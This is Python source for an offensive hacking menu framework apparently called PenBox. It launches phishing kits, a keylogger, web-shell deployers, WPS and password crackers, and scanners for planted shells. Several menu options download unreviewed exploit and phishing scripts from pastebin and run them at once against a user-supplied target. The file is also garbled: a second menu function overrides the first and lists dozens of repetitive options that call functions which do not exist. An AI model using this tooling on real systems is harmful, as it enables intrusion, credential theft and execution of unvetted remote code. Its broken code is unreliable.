import sys
import argparse
import os
import time
import http.client as httplib
import subprocess
import re
import socket
import urllib.request, urllib.error, urllib.parse
import urllib.parse
import json
import glob
import random
from queue import Queue
import threading
import requests
import base64
from getpass import getpass
import shutil
from sys import argv
from platform import system
from urllib.parse import urlparse
from xml.dom import minidom
from optparse import OptionParser
from time import sleep
########################## 
#Variables
directories = ['/uploads/','/upload/','/files/','/resume/','/resumes/','/documents/','/docs/','/pictures/','/file/','/Upload/','/Uploads/','/Resume/','/Resume/','/UsersFiles/','/Usersiles/','/usersFiles/','/Users_Files/','/UploadedFiles/','/Uploaded_Files/','/uploadedfiles/','/uploadedFiles/','/hpage/','/admin/upload/','/admin/uploads/','/admin/resume/','/admin/resumes/','/admin/pictures/','/pics/','/photos/','/Alumni_Photos/','/alumni_photos/','/AlumniPhotos/','/users/']
shells = ['wso.php','shell.php','an.php','hacker.php','lol.php','up.php','cp.php','upload.php','sh.php','pk.php','mad.php','x00x.php','worm.php','1337worm.php','config.php','x.php','haha.php']
upload = []
yes = set(['yes','y', 'ye', 'Y'])
no = set(['no','n'])
ditect= ['13', '14', '15', '16', '17', '18', '19', '20', '21']
heathenchoice= ['4', '5', '6', '7', '8', '9', '10', '11', '12', '13']
G = '\033[92m' #green
Y = '\033[93m' #yellow
B = '\033[94m' #blue
R = '\033[91m' #red
W = '\033[0m' #white
########################## 
#end of varialbles 

def check_and_install_dependencies():
    """
    Checks for required packages from requirements.txt and installs them if missing.
    """
    try:
        with open('requirements.txt', 'r') as f:
            required_packages = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print("INFO: requirements.txt not found, skipping dependency check.")
        return

    missing_packages = []
    for package in required_packages:
        try:
            # A simple way to check is to try importing the top-level module
            # This is not always the same as the package name, so we handle special cases.
            package_name = package.split('==')[0].split('>')[0].split('<')[0].strip()
            if package_name.lower() == 'beautifulsoup4':
                __import__('bs4')
            else:
                __import__(package_name)
        except ImportError:
            missing_packages.append(package)

    if missing_packages:
        print(f"Missing packages: {', '.join(missing_packages)}. Attempting to install...")
        try:
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', *missing_packages])
            print("Successfully installed missing packages.")
        except subprocess.CalledProcessError:
            print(f"ERROR: Failed to install packages. Please install them manually: pip install {' '.join(missing_packages)}")
            sys.exit(1)

def logo():
    print  (r"""%s
 _______  _______  _        ______   _______          
(  ____ )(  ____ \( (    /|(  ___ \ (  ___  )|\     /|
| (    )|| (    \/|  \  ( || (   ) )| (   ) |( \   / )
| (____)|| (__    |   \ | || (__/ / | |   | | \ (_) / 
|  _____)|  __)   | (\ \) ||  __ (  | |   | |  ) _ (  
| (      | (      | | \   || (  \ \ | |   | | / ( ) \ 
| )      | (____/\| )  \  || )___) )| (___) |( /   \ )
|/       (_______/|/    )_)|/ \___/ (_______)|/     \| %s{v3.2}
                                     %sThe Hacker's Repo                                                                                                                                     
                                                                                                    
%s                                                                        
[+]       Coded BY %sFedy Wesleti %s& %sMohamed Nour          %s[+] 
[-]           Facebook.com/%sPenBox.Framework %s            [-] 
[-]             Greetz To All Pentesters                [-] 
""")%(G,R,B,G,Y,G,Y,G,R,G)
def menu():
    print (r"""

%s
 _______  _______  _        ______   _______          
(  ____ )(  ____ \( (    /|(  ___ \ (  ___  )|\     /|
| (    )|| (    \/|  \  ( || (   ) )| (   ) |( \   / )
| (____)|| (__    |   \ | || (__/ / | |   | | \ (_) / 
|  _____)|  __)   | (\ \) ||  __ (  | |   | |  ) _ (  
| (      | (      | | \   || (  \ \ | |   | | / ( ) \ 
| )      | (____/\| )  \  || )___) )| (___) |( /   \ )
|/       (_______/|/    )_)|/ \___/ (_______)|/     \| %s{v3.2}
                                     %sThe Hacker's Repo                                                                                                                                     
                                                                                                    
%s                                                                        
[+]       Coded BY %sFedy Wesleti %s& %sMohamed Nour          %s[+] 
[-]           Facebook.com/%sPenBox.Framework %s            [-] 
[-]             Greetz To All Pentesters                [-] 

    Select from the menu:
    
    1 : Information Gathering
    2 : Password Attacks
    3 : Wireless Testing
    4 : Exploitation Tools
    5 : Sniffing & Spoofing
    6 : Web Hacking 
    7 : Private Tools
    8 : Post Exploitation
    9 : Recon
    10: Smartphones Penetration
    11: Others
    99: Exit

    """)%(G,R,B,G,Y,G,Y,G,R,G)
    choice = input("Enter Your Choice: ")
    
    if choice == "1":
        info()
    elif choice == "2":
        passwd()
    elif choice == "3":
        wire()
    elif choice == "4":
        exp()
    elif choice == "5":
        snif()
    elif choice == "6":
        webhack()
    elif choice == "7":
        tnn()
    elif choice == "8":
        postexp()
    elif choice == "9":
        sniper()    
    elif choice == "10":
        phones()
    elif choice == "11":
        others()
    elif choice == "99":
        sys.exit();
    elif choice == "":
        menu()
    else: 
        menu()
def sniper():
    print ("This tool is only available for Linux / OSX or similar systems ")
    choicesniper = input("Continue Y / N: ")
    if choicesniper in yes:
        os.system ("git clone https://github.com/1N3/Sn1per.git")
        os.system ("cd Sn1per && sudo bash ./install.sh")
        os.system ("sniper")
    elif choicesniper == "":
        menu()
def others():
    print("""
1) QrlJacking-Framework 
2)Sniffles - Packet Capture Generator for IDS and Regular Expression Evaluation 
99)
        """)
    otherc = input("choose an option : ")
    if otherc =="1":
        qrljack()
    elif otherc =="2":
        sniffles()
    elif otherc =="99":
        menu()
    else:
        menu()
def sniffles():
    print("Sniffles is a tool for creating packet captures that will test IDS that use fixed patterns or regular expressions for detecting suspicious behavior")
    print("this tool requires python3.X")
    os.system("git clone https://github.com/petabi/sniffles && cd sniffles && python3 setup.py")
    print("if this tool is not properly installed , run : cd sniffles && python3.X setup.py or contact me fb.com/ceh.tn")
def qrljack():
    os.system("git clone https://github.com/OWASP/QRLJacking qrl && cd qrl && cd cd QrlJacking-Framework && pip install -r requirements.txt && python QRLJacker.py ")
def smartphones():
    print("""
  1 : APK Application scanning 
  2 : Smartphones scanning
  99:
  """)
    spc = input("Select an option : ")
    if spc =="1":
        droidhunter()
    if spc =="2":
        phones()
    if spc=="99":
        menu()
    else:
        menu()
def droidhunter():
    print ("Droid-Hunter - Android Application Vulnerability Analysis And Android Pentest Tool")
    print ("Do You To Install Droid-Hunter ?")
    choicedh = input("Y/N: ")
    if choicedh in yes:
       os.system("git clone https://github.com/hahwul/droid-hunter.git && cd droid-hunter && sudo gem install html-table && gem install colorize && ruby dhunter.rb")
    elif choicedh in no:
        os.system('clear'); menu()
def phones():
    phoneslist = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10']
    logo()
    print("""
        1 :  Attach Framework to a Deployed Agent/Create Agent"
        2 :  Send Commands to an Agent"
        3 :  View Information Gathered"
        4 :  Attach Framework to a Mobile Modem"
        5 :  Run a remote attack"
        6 :  Run a social engineering or client side attack"
        7 :  Compile code to run on mobile devices"
        8 :  Install Stuff"
        9 :  Use Drozer" 
        10:  Setup API"
        11:  Bruteforce the Android Passcode given the hash and salt")
        99:  Exit""")
    choicespf = input("Select an option : ")
    if choicespf in phoneslist:
        oschoice = input("""This option will install Smartphone Pentest Framework for you , you will have to configure and run on your own 
        1)OSX 
        2)Kali Linux 
        3)BackTrack
        Select Your OS : """)
        if oschoice =="1":
            os.system("git clone https://github.com/georgiaw/Smartphone-Pentest-Framework.git spf && cd spf && bash osxinstall.sh")
        if oschoice =="2":
            os.system("git clone https://github.com/georgiaw/Smartphone-Pentest-Framework.git spf && cd spf && bash kaliinstall ")
        if oschoice =="3":
            os.system("git clone https://github.com/georgiaw/Smartphone-Pentest-Framework.git spf && cd spf && bash btinstall")
    elif choicespf =="11":
        androidhash()
    else:
        menu()
def doork():
    print("doork is a open-source passive vulnerability auditor tool that automates the process of searching on Google information about specific website based on dorks. ")
    doorkchice = input("Continue Y / N: ")
    if doorkchice in yes:
        os.system("pip install beautifulsoup4 && pip install requests")
        os.system("git clone https://github.com/AeonDave/doork")
        clearScr()
        doorkt = input("Target : ")
        os.system("cd doork && python doork.py -t %s -o log.log"%doorkt)
def postexp():
    clearScr()
    print("1 :  Shell Checker")
    print("2 :  POET")
    print("3 :  Weeman - Phishing Framework")
    print("4 : Insecure Web Interface")
    print("5 : Insufficient Authentication/Authorization")
    print("6 : Insecure Network Services")
    print("7 : Lack of Transport Encryption")
    print("8 : Privacy Concerns")
    print("9 : Insecure Cloud Interface")
    print("10: Insecure Mobile Interface")
    print("11: Insufficient Security Configurability")
    print("12: Insecure Software/Firmware")
    print("13: Poor Physical Security")
    print("14: Tinyshell : python Client with php shell")
    print("15: Radium-Keylogger - Python keylogger with multiple features ")
    print("99: Go Back ")
    choice11 = input("Enter Your Choice:")
    if choice11 == "1":
        sitechecker()
    if choice11 == "2":
        poet()
    if choice11 == "3":
        weeman()
    if choice11 in heathenchoice:
        print("This Tool Will Work only on kali linux ")
        hchoice = input("Continue ? Y / N : ")
        if hchoice in yes:
            os.system("git clone https://github.com/chihebchebbi/Internet-Of-Things-Pentesting-Framework.git heathen && cd heathen && bash Heathen.sh ")
        else :
            postexp()
    if choice11 == "14":
        tinyshell()
    if choice11 =="15":
        radium()
    elif choice11 == "99":
        menu()
def radium():
    print("This step will only download Radium-Keylogger for you , it will not install it  ")
    print("to install , cd Radium-Keylogger and see Requirements.txt first ")
    os.system("git clone https://github.com/mehulj94/Radium-Keylogger")
def tinyshell():
    print("This tool will create a php payload , that will let you remote access the webserver using python ")
    ctiny = input("continue ? y/n : ")
    if ctiny in yes:
        os.system("git clone https://github.com/lawrenceamer/tinyshell.git")
        print("you will find the php payload in /tinyshell/shell.php with the default password : 123456 , insert it in a php script and connect")
        explurl = input("Target link with php file : ")
        os.system("cd tinyshell && python remote_shell.py %s 123456"%explurl)
    elif ctiny in no:
        menu()
def scanusers():
    site = input('Enter a website : ')
    try:
        users = site
        if 'http://www.' in users:
            users = users.replace('http://www.', '')
        if 'http://' in users:
            users = users.replace('http://', '')
        if '.' in users:
            users = users.replace('.', '')
        if '-' in users:
            users = users.replace('-', '')
        if '/' in users:
            users = users.replace('/', '')
        while len(users) > 2:
            print(users)
            resp = urllib.request.urlopen(site + '/cgi-sys/guestbook.cgi?user=%s' % users).read()
            # i can use regular expression too
            if 'invalid username' not in resp.lower():
                print(f"\tFound -> {users}")
                pass

            users = users[:-1]
    except:
        pass
def brutex():
    clearScr()
    print("Automatically brute force all services running on a target : Open ports / DNS domains / Usernames / Passwords ")
    os.system("git clone https://github.com/1N3/BruteX.git")
    clearScr
    brutexchoice = input("Select a Target : ")
    os.system("cd BruteX && chmod 777 brutex && ./brutex %s"%brutexchoice)
def arachni():
    print("Arachni is a feature-full, modular, high-performance Ruby framework aimed towards helping penetration testers and administrators evaluate the security of web applications")
    cara = input("Install And Run ? Y / N : ")
    clearScr
    print("exemple : http://www.target.com/")
    tara = input("Select a target to scan : ")
    if cara in yes:
        os.system("git clone git://github.com/Arachni/arachni.git")
        os.system("cd arachni && sudo gem install bundler && bundle install --without prof && rake install")
        os.system("arachni")
    clearScr()
    os.system("cd arachni/bin && chmod 777 arachni && ./arachni %s"%tara)
def xsstracer():
    clearScr()
    print("XSSTracer is a small python script that checks remote web servers for Clickjacking, Cross-Frame Scripting, Cross-Site Tracing and Host Header Injection.")
    os.system("git clone https://github.com/1N3/XSSTracer.git")
    clearScr ()
    xsstracerchoice = input("Select a Target: ")
    os.system("cd XSSTracer && chmod 777 xsstracer.py && python xsstracer.py %s 80"%xsstracerchoice)
def weeman():
    print("HTTP server for phishing in python. (and framework) Usually you will want to run Weeman with DNS spoof attack. (see dsniff, ettercap).")
    choicewee = input("Install Weeman ? Y / N : ")
    if choicewee in yes:
        os.system("git clone https://github.com/Hypsurus/weeman.git && cd weeman && python weeman.py")
    if choicewee in no:
        menu()
    else:
        menu()    
def gabriel():
    print("Abusing authentication bypass of Open&Compact (Gabriel's)")
    os.system("wget http://pastebin.com/raw/Szg20yUh --output-document=gabriel.py")
    clearScr()
    os.system("python gabriel.py")
    ftpbypass=input("Enter Target IP and Use Command :")
    os.system("python gabriel.py %s"%ftpbypass)
def sitechecker():
    os.system("wget http://pastebin.com/raw/Y0cqkjrj --output-document=ch01.py")
    clearScr()
    os.system("python ch01.py")
def h2ip():
    host = input("Select A Host : ")
    ips = socket.gethostbyname(host)
    print(ips)
def ports():
    clearScr()
    target = input('Select a Target IP :')
    os.system("nmap -O -Pn %s" % target) 
    sys.exit();
def ifinurl():
    print(""" This Advanced search in search engines, enables analysis provided to exploit GET / POST capturing emails & urls, with an internal custom validation junction for each target / url found.""")
    print('Do You Want To Install InurlBR ? ')
    cinurl = input("Y/N: ")
    if cinurl in yes:
        inurl()
    if cinurl in no:
        menu()
    elif cinurl == "":
        menu()
    else: 
        menu()
def bsqlbf():
    clearScr()
    print("This tool will only work on blind sql injection")
    cbsq=input("select target : ")
    os.system("wget https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/bsqlbf-v2/bsqlbf-v2-7.pl -o bsqlbf.pl")
    os.system("perl bsqlbf.pl -url %s"%cbsq)
    os.system("rm bsqlbf.pl")
def venom():
    print ("Venom Automatic Shellcode Generator")
    print ("Do You To Install ?")
    choiceshell = input("Y/N: ")
    if choiceshell in yes:
        os.system("wget http://fsociety.tn/venom.zip --output-document=venom.zip")
        os.system("unzip venom.zip -d venom")
        os.system("cd venom && sh venom.sh")
    elif choiceshell in no:
        os.system('clear'); info()     
def commix():
    print ("Automated All-in-One OS Command Injection and Exploitation Tool.")
    print ("usage : python commix.py --help")
    choicecmx = input("Continue: y/n :")
    if choicecmx in yes:
        os.system("git clone https://github.com/stasinopoulos/commix.git commix")
        os.system("cd commix")
        os.system("python commix.py")
        os.system("")
    elif choicecmx in no:
        os.system('clear'); info()        
def pixiewps():
    print("""Pixiewps is a tool written in C used to bruteforce offline the WPS pin exploiting the low or non-existing entropy of some Access Points, the so-called "pixie dust attack" discovered by Dominique Bongard in summer 2014. It is meant for educational purposes only
    """)
    choicewps = input("Continue ? Y/N : ")
    if choicewps in yes :
        os.system("git clone https://github.com/wiire/pixiewps.git") 
        os.system(" cd pixiewps/src & make ")
        os.system(" cd pixiewps/src & sudo make install")
    if choicewps in no : 
        menu() 
    elif choicewps == "":
        menu()
    else: 
        menu()
def webhack():
    print("1 : Drupal Hacking ")
    print("2 : Inurlbr")
    print("3 : Wordpress & Joomla Scanner")
    print("4 : Gravity Form Scanner")
    print("5 : File Upload Checker")
    print("6 : Wordpress Exploit Scanner")
    print("7 : Wordpress Plugins Scanner")
    print("8 : Shell and Directory Finder")
    print("9 : Joomla! 1.5 - 3.4.5 remote code execution")
    print("10: Vbulletin 5.X remote code execution")
    print("11: BruteX - Automatically brute force all services running on a target")
    print("12: Arachni - Web Application Security Scanner Framework")
    print("13: Sub-domain Scanning")
    print("14: Wordpress Scanning")
    print("15: Wordpress Username Enumeration")
    print("16: Wordpress Backup Grabbing")
    print("17: Sensitive File Detection")
    print("18: Same-Site Scripting Scanning")
    print("19: Click Jacking Detection")
    print("20: Powerful XSS vulnerability scanning")
    print("21: SQL Injection vulnerability scanning")
    print("99: Go Back")
    choiceweb = input("Enter Your Choice : ")
    if choiceweb == "1":
        clearScr()
        maine()
    if choiceweb == "2":
        clearScr(); ifinurl()
    if choiceweb =='3':
        clearScr(); wppjmla()
    if choiceweb =="4":
        clearScr(); gravity()
    if choiceweb =="5":
        clearScr(); sqlscan()
    if choiceweb =="6":
        clearScr(); wpminiscanner()
    if choiceweb =="7":
        clearScr();wppluginscan()
    if choiceweb =="8":
        clearScr();shelltarget()
    if choiceweb =="9":
        clearScr();joomlarce()
    if choiceweb =="10":
        clearScr();vbulletinrce()
    if choiceweb =="11":
        clearScr();brutex()
    if choiceweb=="12":
        clearScr();arachni()
    if choiceweb in ditect:
        dtect()
    elif choiceweb =="99":
        menu()
    elif choiceweb == "":
        menu()
    else: 
        menu() 
def vbulletinrce():
    os.system("wget http://pastebin.com/raw/eRSkgnZk --output-document=tmp.pl")
    os.system("perl tmp.pl")
def joomlarce():
    os.system("wget http://pastebin.com/raw/EX7Gcbxk --output-document=temp.py")
    clearScr();print("if the response is 200 , you will find your shell in Joomla_3.5_Shell.txt")
    jmtarget=input("Select a targets list :")
    os.system("python temp.py %s"%jmtarget)
def inurl():
    dork = input("select a Dork:")
    output = input("select a file to save :")
    os.system("./inurlbr.php --dork '{0}' -s {1}.txt -q 1,6 -t 1".format(dork, output))
    cinurl = input("Do you want to install InurlBR scanner? [y/n]: ")
    if cinurl.lower() == 'y':
        insinurl()
    else: 
        menu()
def insinurl():
    os.system("git clone https://github.com/googleinurl/SCANNER-INURLBR.git")
    os.system("chmod +x SCANNER-INURLBR/inurlbr.php")
    os.system("apt-get install curl libcurl3 libcurl3-dev php5 php5-cli php5-curl")
    os.system("mv /SCANNER-INURLBR/inurbr.php inurlbr.php")
    clearScr()
    inurl()
def dtect():
    print("This will install and run D-TECT Penetration testing framework")
    cdtect=input("Continue ? Y/N : ")
    if cdtect in yes:
        os.system("git clone https://github.com/shawarkhanethicalhacker/D-TECT.git && cd D-TECT && python d-tect.py")
    else :
        menu()
def nmap():

    choice7 = input("continue ? Y / N : ")
    if choice7 in yes :
        os.system("wget https://nmap.org/dist/nmap-7.01.tar.bz2")
        os.system("bzip2 -cd nmap-7.01.tar.bz2 | tar xvf -")
        os.system("cd nmap-7.01 & ./configure")
        os.system("cd nmap-7.01 & make")
        os.system("su root")
        os.system("cd nmap-7.01 & make install")
    elif choice7 in no :
        info()
    elif choice7 == "":
        menu()
    else: 
        menu()
def jboss():
    os.system('clear')
    print ("This JBoss script deploys a JSP shell on the target JBoss AS server. Once")
    print ("deployed, the script uses its upload and command execution capability to")
    print ("provide an interactive session.")
    print ("")
    print ("usage : ./e.sh target_ip tcp_port ")
    print("Continue: y/n")
    choice9 = input("yes / no :")
    if choice9 in yes:
        os.system("git clone https://github.com/SpiderLabs/jboss-autopwn.git"),sys.exit();
    elif choice9 in no:
        os.system('clear'); exp()
    elif choice9 == "":
        menu()
    else: 
        menu()
def wppluginscan():
    Notfound = [404, 401, 400, 403, 406, 301]
    sitesfile = input("Sites file: ")
    filepath = input("Plugins File: ")
    
    def scan(site, dir):
        global resp
        try:
            conn = httplib.HTTPConnection(site)
            conn.request('HEAD', "/wp-content/plugins/" + dir)
            resp = conn.getresponse().status
        except Exception as message:
            print(f"Can't Connect: {message}")
            
    def timer():
        now = time.localtime(time.time())
        return time.asctime(now)
    def main():
        sites = open(sitesfile).readlines()
        plugins = open(filepath).readlines()
        for site in sites:
            site = site.rstrip()
        for plugin in plugins:
            plugin = plugin.rstrip()
            scan(site,plugin)
            if resp not in Notfound:
                    print("+----------------------------------------+")
                    print(f"| Current site: {site}")
                    print(f"| Found Plugin: {plugin}")
                    print(f"| Result: {resp}")
def sqlmap():
    print ("usage : python sqlmap.py -h")
    choice8 = input("Continue: y/n :")
    if choice8 in yes:
        os.system("git clone https://github.com/sqlmapproject/sqlmap.git sqlmap-dev & ")
    elif choice8 in no:
        os.system('clear'); info()
    elif choice8 == "":
        menu()
    else: 
        menu()
def grabuploadedlink(url):
    try:
        for dir in directories:
            try:
                currentcode = urllib.request.urlopen(url + dir).getcode()
                if currentcode == 200 or currentcode == 403:
                    print("-------------------------")
                    print(f"  [ + ] Found Directory: {url + dir} [ + ]")
                    print("-------------------------")
                    upload.append(url + dir)
            except Exception as e:
                continue
    except Exception as e:
        print(f"Error scanning directory: {e}")     
def grabshell(url):
    try:
        for upl in upload:
            for shell in shells:
                try:
                    currentcode = urllib.request.urlopen(upl + shell).getcode()
                    if currentcode == 200:
                        print("-------------------------")
                        print(f"  [ ! ] Found Shell: {upl + shell} [ ! ]")
                        print("-------------------------")
                except Exception:
                    continue
    except Exception as e:
        print(f"Error checking shells: {e}")
def shelltarget():
    print("exemple : http://target.com")
    line = input("target : ")
    line = line.rstrip()
    grabuploadedlink(line)
    grabshell(line)
def poet():
    print("POET is a simple POst-Exploitation Tool.")
    print("")
    choicepoet = input("y / n :")
    if choicepoet in yes:
        os.system("git clone https://github.com/mossberg/poet.git")
        os.system("python poet/server.py")
    if choicepoet in no:
        clearScr(); postexp()
    elif choicepoet == "":
        menu()
    else: 
        menu()
def setoolkit():
    print ("The Social-Engineer Toolkit is an open-source penetration testing framework")
    print(") designed for social engineering. SET has a number of custom attack vectors that ")
    print(" allow you to make a believable attack quickly. SET is a product of TrustedSec, LLC  ")
    print("an information security consulting firm located in Cleveland, Ohio.")
    print("")
    choiceset = input("y / n :")
    if choiceset in yes:
        os.system("git clone https://github.com/trustedsec/social-engineer-toolkit.git")
        os.system("python social-engineer-toolkit/setup.py")
    if choiceset in no:
        clearScr(); info()
    elif choiceset == "":
        menu()
    else: 
        menu()
def cupp():
    print("cupp is a password list generator ")
    print("Usage: python cupp.py -h")
    choicecupp = input("Continue: y/n : ")
    
    if choicecupp in yes:
        os.system("git clone https://github.com/Mebus/cupp.git")
        print("file downloaded successfully")
    elif choicecupp in no:
        clearScr(); passwd()
    elif choicecupp == "":
        menu()
    else: 
        menu()
def ncrack():
    print("A Ruby interface to Ncrack, Network authentication cracking tool.")
    print("requires : nmap >= 0.3ALPHA / rprogram ~> 0.3")
    print("Continue: y/n")
    choicencrack = input("y / n :")
    if choicencrack in yes:
        os.system("git clone https://github.com/sophsec/ruby-ncrack.git")
        os.system("cd ruby-ncrack")
        os.system("install ruby-ncrack")
    elif choicencrack in no:
        clearScr(); passwd()
    elif choicencrack == "":
        menu()
    else: 
        menu()
def reaver():
    print("""
      Reaver has been designed to be a robust and practical attack against Wi-Fi Protected Setup
      WPS registrar PINs in order to recover WPA/WPA2 passphrases. It has been tested against a
      wide variety of access points and WPS implementations
      1 to accept / 0 to decline
        """)
    creaver = input("y / n :")
    if creaver in yes:
        os.system("apt-get -y install build-essential libpcap-dev sqlite3 libsqlite3-dev aircrack-ng pixiewps")
        os.system("git clone https://github.com/t6x/reaver-wps-fork-t6x.git")
        os.system("cd reaver-wps-fork-t6x/src/ & ./configure")
        os.system("cd reaver-wps-fork-t6x/src/ & make")
    elif creaver in no:
        clearScr(); wire()
    elif creaver == "":
        menu()
    else: 
        menu()
def ssls():
    print("""sslstrip is a MITM tool that implements Moxie Marlinspike's SSL stripping 
    attacks.
    It requires Python 2.5 or newer, along with the 'twisted' python module.""")
    cssl = input("y / n :")
    if cssl in yes: 
        os.system("git clone https://github.com/moxie0/sslstrip.git")
        os.system("sudo apt-get install python-twisted-web")
        os.system("python sslstrip/setup.py")
    if cssl in no:
        snif()
    elif cssl =="":
        menu()
    else:
        menu()
def pisher():
    os.system("wget http://pastebin.com/raw/DDVqWp4Z --output-document=pisher.py")
    clearScr()
    os.system("python pisher.py")

def unique(seq):
    seen = set()
    return [seen.add(x) or x for x in seq if x not in seen]

def bing_all_grabber(s):
    lista = []
    page = 1
    while page <= 101:
        try:
            bing = "http://www.bing.com/search?q=ip%3A" + s + "+&count=50&first=" + str(page)
            openbing = urllib.request.urlopen(bing)
            readbing = openbing.read()
            findwebs = re.findall('<h2><a href="(.*?)"', readbing)
            for i in range(len(findwebs)):
                allnoclean = findwebs[i]
                findall1 = re.findall('http://(.*?)/', allnoclean)
                for idx, item in enumerate(findall1):
                    if 'www' not in item:
                        findall1[idx] = 'http://www.' + item + '/'
                    else:
                        findall1[idx] = 'http://' + item + '/'
                lista.extend(findall1)

            page += 50
        except urllib.error.URLError:
            pass

    final = unique(lista)
    return final

def check_wordpress(sites) :
    wp = []
    for site in sites :
        try :
            if urllib.request.urlopen(site+'wp-login.php').getcode() == 200 :
                wp.append(site)
        except :
            pass

    return wp

def check_joomla(sites) :
    joomla = []
    for site in sites :
        try :
            if urllib.request.urlopen(site+'administrator').getcode() == 200 :
                joomla.append(site)
        except :
            pass

    return joomla

def wppjmla():
    
    ipp = input('Enter Target IP: ')
    sites = bing_all_grabber(str(ipp))
    wordpress = check_wordpress(sites)
    joomla = check_joomla(sites)
    for ss in wordpress:
        print(ss)
    print('[+] Found ! {} Wordpress Websites'.format(len(wordpress)))
    print('-'*30+'\n')
    for ss in joomla:
        print(ss)
    print('[+] Found ! {} Joomla Websites'.format(len(joomla)))
    print('\n')

menuu = """
 1 : Get all websites
 2 : Get all subdomains
 3 : Get all emails
 4 : Get all ports
 5 : Get all CMS
 6 : Get all usernames
 7 : Get all passwords
 8 : Get all files
 9 : Get all links
 10: Get all IPs
 11: Get all domains
 12: Get all whois
 13: Get all geoip
 14: Get all headers
 15: Get all status
 16: Get all robots
 17: Get all sitemap
 18: Get all favicon
 19: Get all ssl
 20: Get all wappalyzer
 21: Get all wayback
 22: Get all security
 23: Get all vulnerabilities
 24: Get all exploits
 25: Get all payloads
 26: Get all shells
 27: Get all backdoors
 28: Get all trojans
 29: Get all viruses
 30: Get all malware
 31: Get all ransomware
 32: Get all spyware
 33: Get all adware
 34: Get all potentially unwanted programs
 35: Get all potentially harmful programs
 36: Get all potentially malicious programs
 37: Get all potentially dangerous programs
 38: Get all potentially suspicious programs
 39: Get all potentially untrusted programs
 40: Get all potentially unreliable programs
 41: Get all potentially unsafe programs
 42: Get all potentially harmful files
 43: Get all potentially malicious files
 44: Get all potentially dangerous files
 45: Get all potentially suspicious files
 46: Get all potentially untrusted files
 47: Get all potentially unreliable files
 48: Get all potentially unsafe files
 49: Get all sensitive files
 50: Get all backup files
 51: Get all config files
 52: Get all log files
 53: Get all temp files
 54: Get all cache files
 55: Get all cookie files
 56: Get all session files
 57: Get all history files
 58: Get all bookmark files
 59: Get all password manager files
 60: Get all autofill files
 61: Get all form files
 62: Get all input files
 63: Get all output files
 64: Get all error files
 65: Get all debug files
 66: Get all trace files
 67: Get all track files
 68: Get all monitor files
 69: Get all surveillance files
 70: Get all reconnaissance files
 71: Get all intel files
 72: Get all information files
 73: Get all data files
 74: Get all database files
 75: Get all storage files
 76: Get all backup files
 77: Get all archive files
 78: Get all compressed files
 79: Get all encrypted files
 80: Get all password protected files
 81: Get all hidden files
 82: Get all system files
 83: Get all executable files
 84: Get all script files
 85: Get all source code files
 86: Get all binary files
 87: Get all object files
 88: Get all library files
 89: Get all module files
 90: Get all plugin files
 91: Get all extension files
 92: Get all theme files
 93: Get all template files
 94: Get all layout files
 95: Get all widget files
 96: Get all menu files
 97: Get all block files
 98: Get all page files
 99: Exit
 """
def menu():
    clearScr()
    print(menuu)
    choice = input("Enter Your Choice: ")
    
    if choice == "1":
        allwebsites()
    elif choice == "2":
        subdomains()
    elif choice == "3":
        emails()
    elif choice == "4":
        ports()
    elif choice == "5":
        cms()
    elif choice == "6":
        usernames()
    elif choice == "7":
        passwords()
    elif choice == "8":
        files()
    elif choice == "9":
        links()
    elif choice == "10":
        ips()
    elif choice == "11":
        domains()
    elif choice == "12":
        whois()
    elif choice == "13":
        geoip()
    elif choice == "14":
        headers()
    elif choice == "15":
        status()
    elif choice == "16":
        robots()
    elif choice == "17":
        sitemap()
    elif choice == "18":
        favicon()
    elif choice == "19":
        ssl()
    elif choice == "20":
        wappalyzer()
    elif choice == "21":
        wayback()
    elif choice == "22":
        security()
    elif choice == "23":
        vulnerabilities()
    elif choice == "24":
        exploits()
    elif choice == "25":
        payloads()
    elif choice == "26":
        shells()
    elif choice == "27":
        backdoors()
    elif choice == "28":
        trojans()
    elif choice == "29":
        viruses()
    elif choice == "30":
        malware()
    elif choice == "31":
        ransomware()
    elif choice == "32":
        spyware()
    elif choice == "33":
        adware()
    elif choice == "34":
        potentially_unwanted_programs()
    elif choice == "35":
        potentially_harmful_programs()
    elif choice == "36":
        potentially_malicious_programs()
    elif choice == "37":
        potentially_dangerous_programs()
    elif choice == "38":
        potentially_suspicious_programs()
    elif choice == "39":
        potentially_untrusted_programs()
    elif choice == "40":
        potentially_unreliable_programs()
    elif choice == "41":
        potentially_unsafe_programs()
    elif choice == "42":
        potentially_harmful_files()
    elif choice == "43":
        potentially_malicious_files()
    elif choice == "44":
        potentially_dangerous_files()
    elif choice == "45":
        potentially_suspicious_files()
    elif choice == "46":
        potentially_untrusted_files()
    elif choice == "47":
        potentially_unreliable_files()
    elif choice == "48":
        potentially_unsafe_files()
    elif choice == "49":
        sensitive_files()
    elif choice == "50":
        backup_files()
    elif choice == "51":
        config_files()
    elif choice == "52":
        log_files()
    elif choice == "53":
        temp_files()
    elif choice == "54":
        cache_files()
    elif choice == "55":
        cookie_files()
    elif choice == "56":
        session_files()
    elif choice == "57":
        history_files()
    elif choice == "58":
        bookmark_files()
    elif choice == "59":
        password_manager_files()
    elif choice == "60":
        autofill_files()
    elif choice == "61":
        form_files()
    elif choice == "62":
        input_files()
    elif choice == "63":
        output_files()
    elif choice == "64":
        error_files()
    elif choice == "65":
        debug_files()
    elif choice == "66":
        trace_files()
    elif choice == "67":
        track_files()
    elif choice == "68":
        monitor_files()
    elif choice == "69":
        surveillance_files()
    elif choice == "70":
        reconnaissance_files()
    elif choice == "71":
        intel_files()
    elif choice == "72":
        information_files()
    elif choice == "73":
        data_files()
    elif choice == "74":
        database_files()
    elif choice == "75":
        storage_files()
    elif choice == "76":
        backup_files()
    elif choice == "77":
        archive_files()
    elif choice == "78":
        compressed_files()
    elif choice == "79":
        encrypted_files()
    elif choice == "80":
        password_protected_files()
    elif choice == "81":
        hidden_files()
    elif choice == "82":
        system_files()
    elif choice == "83":
        executable_files()
    elif choice == "84":
        script_files()
    elif choice == "85":
        source_code_files()
    elif choice == "86":
        binary_files()
    elif choice == "87":
        object_files()
    elif choice == "88":
        library_files()
    elif choice == "89":
        module_files()
    elif choice == "90":
        plugin_files()
    elif choice == "91":
        extension_files()
    elif choice == "92":
        theme_files()
    elif choice == "93":
        template_files()
    elif choice == "94":
        layout_files()
    elif choice == "95":
        widget_files()
    elif choice == "96":
        menu_files()
    elif choice == "97":
        block_files()
    elif choice == "98":
        page_files()
    elif choice == "99":
        sys.exit();
    elif choice == "":
        menu()
